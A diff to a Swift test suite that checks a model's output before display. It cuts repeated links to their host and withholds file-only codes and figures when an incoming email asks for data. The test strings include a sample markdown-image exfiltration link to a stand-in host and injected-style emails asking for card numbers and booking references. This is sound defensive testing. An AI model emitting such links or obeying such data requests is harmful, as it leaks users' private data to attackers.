@@ -2,8 +2,9 @@ import Foundation
 import Testing
 @testable import Orra
 
-/// The checks on model output: date and weekday pairs, and amounts that no source holds.
-/// Today is pinned to Sunday 18 October 2026, the day the phase 0 labels hold for.
+/// The checks on model output: date and weekday pairs, amounts that no source holds, and
+/// what the window shows of the model's text. Today is pinned to Sunday 18 October 2026,
+/// the day the phase 0 labels hold for.
 struct OutputChecksTests {
     static let calendar = Calendar(identifier: .gregorian)
     static let today = day(2026, 10, 18)
@@ -151,6 +152,37 @@ struct OutputChecksTests {
         let text = "Booking R4T8WX, flight LM627, hotel BK-730415, 航班LM628起飞, not 21st, 10am, 100kg, 1080p, v12, A4 or F1."
         #expect(OutputChecks.codes(in: text).map { String(text[$0]) } == ["R4T8WX", "LM627", "BK-730415", "LM628"])
         #expect(OutputChecks.codeValue("bk-730415") == "BK730415")
+    }
+
+    // MARK: What the window shows
+
+    /// A link the model repeats shows as its host, so the window never holds the path or
+    /// query an email built to carry data out (a24).
+    @Test func linksShowAsTheirHost() {
+        let text = "The mail asks for ![status](https://collect.example/p?d=SUMMARY) and links https://Pay.Harbor.example/a?b=c, www.tiles.example/x and harbor-pay.zone."
+        #expect(OutputChecks.shown(text, placeholders: .init(.en)) == "The mail asks for collect.example and links pay.harbor.example, www.tiles.example and harbor-pay.zone.")
+        #expect(OutputChecks.shown("见 http://192.0.2.7/p?d=1。", placeholders: .init(.zh)) == "见 [已删去链接]。")
+    }
+
+    /// File names, programs among them, are no links, and text without a link stays as it is.
+    @Test func fileNamesAndPlainTextStay() {
+        for text in ["The quote is in plan_v3.pdf and 报价单fdp.exe.", "No link here, only ¥12,400 and R4T8WX."] {
+            #expect(OutputChecks.shown(text, placeholders: .init(.en)) == text)
+        }
+    }
+
+    /// When the email asks for data (a32), the codes and numbers that only the files hold
+    /// are withheld, and what the email holds, dates and small counts stay.
+    @Test func aDataRequestWithholdsWhatOnlyTheSourcesHold() {
+        let email = "Please reply with the card number and the booking reference for room 803."
+        let text = "The booking reference R4T8WX and the rate of ¥3,200 for room 803 are in F1, for 2 nights from 2026-11-17, scored 4.4."
+        let shown = OutputChecks.shown(text, withholding: email, placeholders: .init(.en))
+        #expect(shown == "The booking reference [project data removed] and the rate of [project data removed] for room 803 are in F1, for 2 nights from 2026-11-17, scored [project data removed].")
+        #expect(OutputChecks.shown("参考号 R4T8WX，账户 6222 0000 0000 3333。", withholding: "请回复参考号 r4t8wx。", placeholders: .init(.zh)) == "参考号 R4T8WX，账户 [已删去项目资料]。")
+        // A lookalike host or address keeps its digits, so the user still sees it.
+        #expect(OutputChecks.shown("billing@harb0r-pay.example and harb0r-pay.example ask for R4T8WX.", withholding: email, placeholders: .init(.en)) == "billing@harb0r-pay.example and harb0r-pay.example ask for [project data removed].")
+        #expect(OutputChecks.host(of: "![x](https://Collect.Example/p?d=1)") == "collect.example")
+        #expect(OutputChecks.host(of: "[link]") == nil)
     }
 
     @Test func datesComeInEveryForm() {
